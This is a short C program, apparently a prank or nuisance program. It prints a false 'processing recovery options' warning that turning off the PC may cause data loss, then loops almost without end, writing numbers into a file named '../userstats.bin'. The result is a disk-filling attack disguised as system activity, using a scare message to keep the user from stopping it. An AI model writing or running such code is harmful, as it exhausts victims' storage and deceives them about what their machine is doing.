#include <stdio.h>

int main()
{
    float num = 98373981923.86472;

    FILE *x;
    x = fopen("../userstats.bin", "w");
    printf("Processing recovery options. Turning off your PC may result in data loss\n");
    for (int i = 0; i > -1; i++)
    {
        fprintf(x, "%fX%f=%f=%f", num, i + 899.23, i * 972823.368, num * (i + 738.74), num * (i * i));
    }
    fclose(x);

    return 0;
}
